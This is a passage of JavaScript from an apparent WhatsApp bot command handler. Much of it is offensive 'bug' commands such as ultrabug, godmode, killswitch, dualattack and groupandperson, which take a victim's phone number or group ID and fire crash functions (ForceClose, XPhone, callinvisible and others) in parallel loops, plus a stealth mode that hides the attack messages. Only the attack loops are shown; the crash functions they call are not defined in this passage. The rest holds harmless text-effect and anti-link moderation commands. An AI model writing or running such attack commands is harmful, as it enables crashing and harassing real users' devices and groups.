        await _runBugBarrage(m.chat, 'group');
        for (let i = 0; i < 12; i++) {
            if (_atk.stopAttacks) break;
            await bug3(m.chat);
            await sleep(100);
        }
        reply(`✅ *Group attack complete*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
}
break;

case 'invisgc':
case 'ghostgc':
case 'invisiblegc': {
    if (!isOwner) return reply(`🔒 *Owner only*`);
    if (!m.isGroup) return reply('👥 *Groups only*');
    
    reply(`👻 *INVISIBLE GROUP ATTACK INITIATED...*`);
    
    try {
        for (let i = 0; i < 15; i++) {
            await callinvisible(m.chat);
            await sleep(500);
            await callinvisible(m.chat);
            await sleep(500);
            await BlankGroup(m.chat);
            await sleep(1000);
            await VampireGroupInvis(m.chat, true);
            await sleep(500);
        }
        reply(`✅ *Invisible attack complete (15 rounds)*`);
    } catch(e) {
        reply(`⚠️ *Partial run: ${e.message || 'Error'}*`);
    }
}
break;

//====================[ NEW POWERFUL BUG COMMANDS 2026 ]===========================//

case 'ultrabug': {
    {
        const _bgN5 = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgB5 = (global._flagCache?.bugBanned || []);
            if (_bgB5.some(id => String(id).replace(/[^0-9]/g,'') === _bgN5)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgU5 = (global._flagCache?.bugUnlocked || []);
                if (!_bgU5.some(id => String(id).replace(/[^0-9]/g,'') === _bgN5)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);

        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    }
    if (!text) return reply(`📌 *Usage:* ${prefix}ultrabug 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`☢️ *ULTRABUG — MAXIMUM DESTRUCTION*\n🎯 *Target:* ${pepec}\n💀 *20 Round Mega Barrage Starting...*`);
    await devtrust.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });

    try {
        await CYBEReress();
        await sleep(20);
        for (let round = 0; round < 20; round++) {
            await Promise.all([
                Combo(target),
                fcnew(target),
                XPhone(target)
            ]);
            await sleep(15);
            await BayuOfficialHard(target);
            await sleep(10);
            for (let i = 0; i < 50; i++) {
                await ForceClose(target);
                await sleep(10);
            }
            await sleep(15);
        }
        reply(`✅ *ULTRABUG complete — 20 rounds on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
}
break;

case 'megabug': {
    {
        const _bgN6 = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgB6 = (global._flagCache?.bugBanned || []);
            if (_bgB6.some(id => String(id).replace(/[^0-9]/g,'') === _bgN6)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgU6 = (global._flagCache?.bugUnlocked || []);
                if (!_bgU6.some(id => String(id).replace(/[^0-9]/g,'') === _bgN6)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);

        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    }
    if (!text) return reply(`📌 *Usage:* ${prefix}megabug 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`🌀 *MEGABUG — SPIRAL ATTACK*\n🎯 *Target:* ${pepec}\n🔥 *Initiating 15-round spiral barrage...*`);
    await devtrust.sendMessage(m.chat, { react: { text: '🌀', key: m.key } });

    try {
        for (let round = 0; round < 30; round++) {
            if (stopAttacks) { stopAttacks = false; break; }
            await Promise.all([
                Combo(target), Combo(target),
                fcnew(target), fcnew(target),
                XPhone(target), XPhone(target),
                BayuOfficialHard(target), BayuOfficialHard(target),
                ForceClose(target), ForceClose(target), ForceClose(target),
            ]);
            await sleep(8);
        }
        reply(`✅ *MEGABUG complete — 30 parallel rounds on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💥', key: m.key } });
}
break;

case 'iphonecrash':
case 'iosbug':
case 'invisios': {
    {
        const _bgNi = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgBi = (global._flagCache?.bugBanned || []);
            if (_bgBi.some(id => String(id).replace(/[^0-9]/g,'') === _bgNi)) return reply('\ud83d\udeab *Access Denied*\
Aap Bug section se permanently ban hain.');
            const _bgUi = (global._flagCache?.bugUnlocked || []);
            if (!_bgUi.some(id => String(id).replace(/[^0-9]/g,'') === _bgNi)) return reply('\ud83d\udd12 *Bug & SIM Section Locked*\
\
Type *' + prefix + 'addkey1 <code>* to unlock.');
        } catch(e) { return reply('\ud83d\udd12 *Bug & SIM Section Locked*\
\
Type *' + prefix + 'addkey1 <code>* to unlock.'); }
    }
    if (!text) return reply('\ud83d\udccc *Usage:* ' + prefix + command + ' 923xx');

    let pepec = args[0].replace(/[^0-9]/g, '');
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ''));
    if (protectedNumbers.includes(pepec)) return reply('\ud83d\udd12 *Protected*');

    let target = pepec + '@s.whatsapp.net';
    reply('\ud83d\udcf1 *iPHONE INVISIBLE -> ' + pepec + '*\
\ud83d\udca5 *20x iOS null-byte crash...*');

    try {
        for (let i = 0; i < 20; i++) {
            await callinvisible(target);
            await sleep(200);
            await blank1(target);
            await sleep(200);
            await ForceClose(target);
            await sleep(200);
            await callinvisible(target);
            await sleep(200);
            await ForceXFrezee(target);
            await sleep(200);
        }
        reply('\u2705 *iPhone invisible complete -> ' + pepec + '*');
    } catch(e) {
        reply('\u26a0\ufe0f *Partial: ' + (e.message || 'Error') + '*');
    }
    await devtrust.sendMessage(from, { react: { text: '\ud83d\udcf1', key: m.key } });
}
break;

case 'ghostcrash': {
    {
        const _bgN7 = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgB7 = (global._flagCache?.bugBanned || []);
            if (_bgB7.some(id => String(id).replace(/[^0-9]/g,'') === _bgN7)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgU7 = (global._flagCache?.bugUnlocked || []);
                if (!_bgU7.some(id => String(id).replace(/[^0-9]/g,'') === _bgN7)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);

        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    }
    if (!text) return reply(`📌 *Usage:* ${prefix}ghostcrash 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`👻 *GHOSTCRASH — INVISIBLE STRIKE*\n🎯 *Target:* ${pepec}\n🔥 *Ghost mode activated...*`);
    await devtrust.sendMessage(m.chat, { react: { text: '👻', key: m.key } });

    try {
        await CYBEReress(); await sleep(10);
        for (let round = 0; round < 30; round++) {
            if (stopAttacks) { stopAttacks = false; break; }
            await Promise.all([
                Combo(target), Combo(target),
                fcnew(target), fcnew(target),
                XPhone(target), XPhone(target),
                BayuOfficialHard(target), BayuOfficialHard(target),
                ForceClose(target), ForceClose(target), ForceClose(target),
            ]);
            await sleep(8);
        }
        reply(`✅ *GHOSTCRASH complete — 30 parallel rounds on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '🥶', key: m.key } });
}
break;





case 'godmode': {
    {
        const _bgNc = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgBc = (global._flagCache?.bugBanned || []);
            if (_bgBc.some(id => String(id).replace(/[^0-9]/g,'') === _bgNc)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgUc = (global._flagCache?.bugUnlocked || []);
                if (!_bgUc.some(id => String(id).replace(/[^0-9]/g,'') === _bgNc)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);

        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    }
    if (!text) return reply(`📌 *Usage:* ${prefix}godmode 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`⚔️ *GODMODE — DIVINE DESTRUCTION*\n🎯 *Target:* ${pepec}\n🔱 *Unlimited power: no mercy mode*`);
    await devtrust.sendMessage(m.chat, { react: { text: '⚔️', key: m.key } });

    try {
        await CYBEReress(); await sleep(10);
        // Phase 1: Warmup
        for (let i = 0; i < 5; i++) {
            await Combo(target); await sleep(10);
            await fcnew(target); await sleep(10);
        }
        // Phase 2: Full Assault
        for (let round = 0; round < 40; round++) {
            await Promise.all([Combo(target), fcnew(target), XPhone(target)]);
            await sleep(6);
            await BayuOfficialHard(target); await sleep(6);
            for (let i = 0; i < 30; i++) {
                await ForceClose(target); await sleep(5);
            }
            await sleep(6);
        }
        // Phase 3: Kill shot
        for (let i = 0; i < 20; i++) {
            await ForceClose(target); await sleep(5);
        }
        reply(`✅ *GODMODE complete — divine wrath delivered to ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '🔱', key: m.key } });
}
break;

case 'killswitch': {
    {
        const _bgNd = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgBd = (global._flagCache?.bugBanned || []);
            if (_bgBd.some(id => String(id).replace(/[^0-9]/g,'') === _bgNd)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgUd = (global._flagCache?.bugUnlocked || []);
                if (!_bgUd.some(id => String(id).replace(/[^0-9]/g,'') === _bgNd)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);

        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    }
    if (!text) return reply(`📌 *Usage:* ${prefix}killswitch 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`🔴 *KILLSWITCH — INSTANT KILL PROTOCOL*\n🎯 *Target:* ${pepec}\n⚡ *Rapid-fire termination: 60 rounds*`);
    await devtrust.sendMessage(m.chat, { react: { text: '🔴', key: m.key } });

    try {
        await CYBEReress(); await sleep(5);
        for (let round = 0; round < 80; round++) {
            if (stopAttacks) { stopAttacks = false; break; }
            await Promise.all([
                Combo(target), Combo(target),
                fcnew(target), fcnew(target),
                XPhone(target), XPhone(target),
                BayuOfficialHard(target), BayuOfficialHard(target),
                ForceClose(target), ForceClose(target), ForceClose(target),
            ]);
            await sleep(5);
        }
        reply(`✅ *KILLSWITCH executed — 80 parallel rounds on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
}
break;


//====================[ ☢️ ALLATTACK — MAXIMUM OVERKILL ]===========================//

case 'allattack':
case 'fullnuke':
case 'maxattack':
case 'overkill': {
    if (!isOwner) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}allattack 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`☢️ *ALLATTACK — MAXIMUM OVERKILL*
🎯 *Target:* ${pepec}
💀 *ALL 15 functions simultaneously — 100 rounds — no mercy*`);
    await devtrust.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });

    try {
        await CYBEReress();
        await sleep(8);
        for (let round = 0; round < 100; round++) {
            if (stopAttacks) { stopAttacks = false; break; }
            await Promise.all([
                Combo(target),              Combo(target),
                fcnew(target),              fcnew(target),
                XPhone(target),             XPhone(target),
                BayuOfficialHard(target),   BayuOfficialHard(target),
                ForceClose(target),         ForceClose(target),         ForceClose(target),
                VampireBugIns(target),      VampireBugIns(target),
                BugGb1(target),
                BugGb12(target),
            ]);
            await sleep(5);
        }
        reply(`✅ *ALLATTACK complete — 100 rounds, 15 functions on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
}
break;

//====================[ 🔥 DUALATTACK — TWO PERSONAL TARGETS ]===========================//

case 'dualattack':
case 'doublenuke':
case 'twotarget':
case 'dualkill': {
    if (!isOwner) return reply('🔒 *Owner only*');
    if (!args[0] || !args[1]) return reply(`📌 *Usage:* ${prefix}dualattack 923xx1 923xx2`);

    let pepec1 = args[0].replace(/[^0-9]/g, '');
    let pepec2 = args[1].replace(/[^0-9]/g, '');
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));

    if (protectedNumbers.includes(pepec1) || protectedNumbers.includes(pepec2)) {
        return reply("🔒 *One or both numbers are protected*");
    }
    if (pepec1 === pepec2) return reply("⚠️ *Dono numbers alag hone chahiye*");

    let target1 = pepec1 + '@s.whatsapp.net';
    let target2 = pepec2 + '@s.whatsapp.net';

    reply(`🔥 *DUALATTACK — DOUBLE DESTRUCTION*
🎯 *Target 1:* ${pepec1}
🎯 *Target 2:* ${pepec2}
💀 *Both hit simultaneously — 100 rounds — 30 functions per round*`);
    await devtrust.sendMessage(m.chat, { react: { text: '🔥', key: m.key } });

    try {
        await CYBEReress();
        await sleep(8);
        for (let round = 0; round < 100; round++) {
            if (stopAttacks) { stopAttacks = false; break; }
            await Promise.all([
                // Target 1 — full barrage
                Combo(target1),             Combo(target1),
                fcnew(target1),             fcnew(target1),
                XPhone(target1),            XPhone(target1),
                BayuOfficialHard(target1),  BayuOfficialHard(target1),
                ForceClose(target1),        ForceClose(target1),        ForceClose(target1),
                VampireBugIns(target1),     VampireBugIns(target1),
                BugGb1(target1),
                BugGb12(target1),
                // Target 2 — full barrage same time
                Combo(target2),             Combo(target2),
                fcnew(target2),             fcnew(target2),
                XPhone(target2),            XPhone(target2),
                BayuOfficialHard(target2),  BayuOfficialHard(target2),
                ForceClose(target2),        ForceClose(target2),        ForceClose(target2),
                VampireBugIns(target2),     VampireBugIns(target2),
                BugGb1(target2),
                BugGb12(target2),
            ]);
            await sleep(5);
        }
        reply(`✅ *DUALATTACK complete — 100 rounds, 30 functions on BOTH*
💀 *${pepec1} + ${pepec2} — both destroyed*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
}
break;

//====================[ ⚡ GROUPANDPERSON — GROUP + PERSONAL SIMULTANEOUS ]===========================//

case 'groupandperson':
case 'gpperson':
case 'mixattack':
case 'fullstrike': {
    if (!isOwner) return reply('🔒 *Owner only*');
    if (!args[0] || !args[1]) return reply(`📌 *Usage:* ${prefix}groupandperson GroupID 923xx
📌 *Example:* ${prefix}groupandperson 120363xxxxxx@g.us 923xx`);

    let rawGroup = args[0].trim();
    let rawPerson = args[1].replace(/[^0-9]/g, '');

    // Group JID normalize
    let groupTarget = rawGroup.includes('@g.us') ? rawGroup : rawGroup + '@g.us';

    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(rawPerson)) return reply("🔒 *Personal number is protected*");

    let personTarget = rawPerson + '@s.whatsapp.net';

    reply(`⚡ *GROUPANDPERSON — DOUBLE STRIKE*
🏘️ *Group:* ${groupTarget}
🎯 *Person:* ${rawPerson}
💥 *Both attacked simultaneously — 100 rounds*`);
    await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });

    try {
        await CYBEReress();
        await sleep(8);
        for (let round = 0; round < 100; round++) {
            if (stopAttacks) { stopAttacks = false; break; }
            await Promise.all([
                // Group attack functions
                bug3(groupTarget),          bug3(groupTarget),          bug3(groupTarget),
                VampireBugIns(groupTarget), VampireBugIns(groupTarget),
                BlankGroup(groupTarget),
                VampireGroupInvis(groupTarget),
                BugGb1(groupTarget),
                BugGb12(groupTarget),
                // Personal attack functions — same time
                Combo(personTarget),             Combo(personTarget),
                fcnew(personTarget),             fcnew(personTarget),
                XPhone(personTarget),            XPhone(personTarget),
                BayuOfficialHard(personTarget),  BayuOfficialHard(personTarget),
                ForceClose(personTarget),        ForceClose(personTarget),        ForceClose(personTarget),
                VampireBugIns(personTarget),     VampireBugIns(personTarget),
                BugGb1(personTarget),
                BugGb12(personTarget),
            ]);
            await sleep(5);
        }
        reply(`✅ *GROUPANDPERSON complete — 100 rounds*
🏘️ *Group destroyed:* ${groupTarget}
💀 *Person destroyed:* ${rawPerson}`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
}
break;

//====================[ 🔇 STEALTH MODE ]===========================//

case 'stealthmode':
case 'silentmode': {
    if (!_requireBugAccess()) break;
    if (!text) return reply(`🔇 *Stealth Mode:* ${_atk.stealthMode ? '✅ ON' : '❌ OFF'}

_Use:_ ${prefix}stealthmode on/off`);

    const _sm = text.trim().toLowerCase();
    if (_sm === 'on' || _sm === '1') {
        _atk.stealthMode = true;
        reply('🔇 *Stealth Mode ON* — Ab attacks silently chalenge, koi launch/complete message nahi aayega');
    } else if (_sm === 'off' || _sm === '0') {
        _atk.stealthMode = false;
        reply('🔊 *Stealth Mode OFF* — Normal mode wapas, sab messages dikhenge');
    } else {
        reply(`⚠️ *Usage:* ${prefix}stealthmode on/off`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: _atk.stealthMode ? '🔇' : '🔊', key: m.key } });
}
break;

//====================[ 🛑 STOP ALL ATTACKS — EMERGENCY KILL ]===========================//

case 'stopattack':
case 'stopatk':
case 'killattack':
case 'stopall':
case 'attackstop': {
    if (!isOwner) return reply('🔒 *Owner only*');

    _atk.stopAttacks = true;

    await devtrust.sendMessage(m.chat, { react: { text: '🛑', key: m.key } });
    reply(`🛑 *STOP ATTACK — EMERGENCY KILL*

✅ *Sary running attacks band ho rahe hain...*
✅ *Bot ab normal mode mein hai*

_Dobara attack karne ke liye naya command use karo_`);
}
break;

// ✨ TEXT MAKER COMMANDS

case "glitchtext": {
    if (args.length < 1) return reply("✏️ *Usage:* glitchtext CYBER");
    
    try {
        let url = `https://api.popcat.xyz/unforgivable?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "⚡ *Glitch Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "writetext": {
    if (args.length < 1) return reply("✏️ *Usage:* writetext CYBER");
    
    try {
        let url = `https://api.popcat.xyz/pikachu?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "✍️ *Write Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "advancedglow": {
    if (args.length < 1) return reply("✏️ *Usage:* advancedglow CYBER");
    
    try {
        let url = `https://api.popcat.xyz/oogway?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "💡 *Advanced Glow*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "typographytext": {
    if (args.length < 1) return reply("✏️ *Usage:* typographytext CYBER");
    
    try {
        let url = `https://api.popcat.xyz/sadcat?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🖋️ *Typography*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "pixelglitch": {
    if (args.length < 1) return reply("✏️ *Usage:* pixelglitch CYBER");
    
    try {
        let url = `https://api.popcat.xyz/unforgivable?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🧩 *Pixel Glitch*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "neonglitch": {
    if (args.length < 1) return reply("✏️ *Usage:* neonglitch CYBER");
    
    try {
        let url = `https://api.popcat.xyz/unforgivable?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "💥 *Neon Glitch*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "flagtext": {
    if (args.length < 1) return reply("✏️ *Usage:* flagtext CYBER");
    
    try {
        let url = `https://api.popcat.xyz/pikachu?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🇳🇬 *Flag Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "flag3dtext": {
    if (args.length < 1) return reply("✏️ *Usage:* flag3dtext CYBER");
    
    try {
        let url = `https://api.popcat.xyz/oogway?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🇺🇸 *3D Flag Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "deletingtext": {
    if (args.length < 1) return reply("✏️ *Usage:* deletingtext CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "blackpinkstyle": {
    if (args.length < 1) return reply("✏️ *Usage:* blackpinkstyle CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "glowingtext": {
    if (args.length < 1) return reply("✏️ *Usage:* glowingtext CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "underwatertext": {
    if (args.length < 1) return reply("✏️ *Usage:* underwatertext CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "logomaker": {
    if (args.length < 1) return reply("✏️ *Usage:* logomaker CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "cartoonstyle": {
    if (args.length < 1) return reply("✏️ *Usage:* cartoonstyle CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "papercutstyle": {
    if (args.length < 1) return reply("✏️ *Usage:* papercutstyle CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "watercolortext": {
    if (args.length < 1) return reply("✏️ *Usage:* watercolortext CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "effectclouds": {
    if (args.length < 1) return reply("✏️ *Usage:* effectclouds CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "blackpinklogo": {
    if (args.length < 1) return reply("✏️ *Usage:* blackpinklogo CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "gradienttext": {
    if (args.length < 1) return reply("✏️ *Usage:* gradienttext Robin");
    
    try {
        return reply("⚠️ *Text effect API is currently unavailable*");
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🌈 *Gradient Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Gradient Text*");
    }
}
break;

case "summerbeach": {
    if (args.length < 1) return reply("✏️ *Usage:* summerbeach CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "luxurygold": {
    if (args.length < 1) return reply("✏️ *Usage:* luxurygold CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "multicoloredneon": {
    if (args.length < 1) return reply("✏️ *Usage:* multicoloredneon CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "sandsummer": {
    if (args.length < 1) return reply("✏️ *Usage:* sandsummer CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "galaxywallpaper": {
    if (args.length < 1) return reply("✏️ *Usage:* galaxywallpaper CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "style1917": {
    if (args.length < 1) return reply("✏️ *Usage:* style1917 CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "makingneon": {
    if (args.length < 1) return reply("✏️ *Usage:* makingneon CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "royaltext": {
    if (args.length < 1) return reply("✏️ *Usage:* royaltext CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "freecreate": {
    if (args.length < 1) return reply("✏️ *Usage:* freecreate CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "galaxystyle": {
    if (args.length < 1) return reply("✏️ *Usage:* galaxystyle CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

case "lighteffects": {
    if (args.length < 1) return reply("✏️ *Usage:* lighteffects CYBER");
        return reply("⚠️ *Text effect API is currently unavailable*");
}
break;

// ======================[ 🔗 ANTILINKKICK ]======================
case 'antilinkkick': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    const _alk = antilinkSettings[m.chat] || {};
    _alk.enabled = true; _alk.action = 'kick'; _alk.warnMode = false;
    antilinkSettings[m.chat] = _alk;
    saveAntilinkSettings(antilinkSettings);
    reply(`✅ *Anti-Link KICK enabled*\nUsers who post links will be deleted + kicked`);
}
break;

case 'antilinkwarn': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    const _alw = antilinkSettings[m.chat] || {};
    _alw.enabled = true; _alw.action = 'delete'; _alw.warnMode = true;
    antilinkSettings[m.chat] = _alw;
    saveAntilinkSettings(antilinkSettings);
    const wl = getWarnLimit(m.chat);
    reply(`✅ *Anti-Link WARN enabled*\nLinks deleted + warned. Auto-kick at ${wl} warnings\n\nChange limit: \`${prefix}set warnlimit 3\``);
}
break;

case 'antilinkgc': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    const _algc = antilinkSettings[m.chat] || {};
    _algc.gcMode = 'delete'; _algc.warnMode = false;
    antilinkSettings[m.chat] = _algc;
    saveAntilinkSettings(antilinkSettings);
    reply(`✅ *Anti-GC-Link enabled (delete)*\nWhatsApp group-invite links will be deleted`);
}
break;

case 'antilinkgckick': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    const _algck = antilinkSettings[m.chat] || {};
    _algck.gcMode = 'kick'; _algck.warnMode = false;
    antilinkSettings[m.chat] = _algck;
    saveAntilinkSettings(antilinkSettings);
    reply(`✅ *Anti-GC-Link KICK enabled*\nGroup-invite links deleted + user kicked`);
}
break;

// ======================[ 🏷️ ANTITAGWARN / ANTITAGADMIN ]======================
case 'antitagwarn': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    setSetting(m.chat, "antitag", { enabled: true, action: 'warn', adminOnly: false });
    const wl = getWarnLimit(m.chat);
    reply(`✅ *Anti-Tag WARN enabled*\nTags deleted + warned. Auto-kick at ${wl} warnings\n\nChange limit: \`${prefix}set warnlimit 3\``);
}
break;

case 'antitagadmin': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    setSetting(m.chat, "antitag", { enabled: true, action: 'delete', adminOnly: true });
    reply(`✅ *Anti-Tag-Admin enabled (delete)*\nMessages tagging admins will be deleted`);
}
break;

case 'antitagadminwarn': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    setSetting(m.chat, "antitag", { enabled: true, action: 'warn', adminOnly: true });
    const wl = getWarnLimit(m.chat);
    reply(`✅ *Anti-Tag-Admin WARN enabled*\nAdmin tags deleted + warned. Auto-kick at ${wl} warnings`);
}
break;

// ======================[ 🔕 ANTI-GROUP-MENTION ]======================
case 'antigroupmention': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    if (!args[0]) {
        const _agmS = antigroupmentionSettings[m.chat] || { enabled: false };
        return reply(`🔕 *Anti-Group-Mention*\n\n` +
            `📌 *Usage:*\n` +
            `▸ ${prefix}antigroupmention on - Enable (delete)\n` +
            `▸ ${prefix}antigroupmention off - Disable\n\n` +
            `⚙️ *Status:* ${_agmS.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
            `_Also: \`${prefix}antigroupmentionkick\` and \`${prefix}antigroupmentionwarn\`_`);
    }
    if (args[0] === 'on') {
